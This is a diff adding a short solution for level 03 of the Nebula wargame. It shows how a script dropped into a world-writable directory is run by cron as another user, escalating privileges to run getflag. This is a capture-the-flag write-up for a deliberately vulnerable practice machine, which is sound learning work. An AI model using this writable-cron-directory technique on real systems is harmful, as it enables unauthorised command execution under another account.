@@ -5,6 +5,18 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 03
+--------
+
+##### exploit writable.d permissions to execute getflag as flag03
+```bash
+level03@nebula:~$ echo 'getflag > /tmp/getflag03.log' > /home/flag03/writable.d/foo.sh
+# wait for cron execution
+level03@nebula:~$ cat /tmp/getflag03.log 
+You have successfully executed getflag on a target account
+```
+
+
 level 04
 --------
 
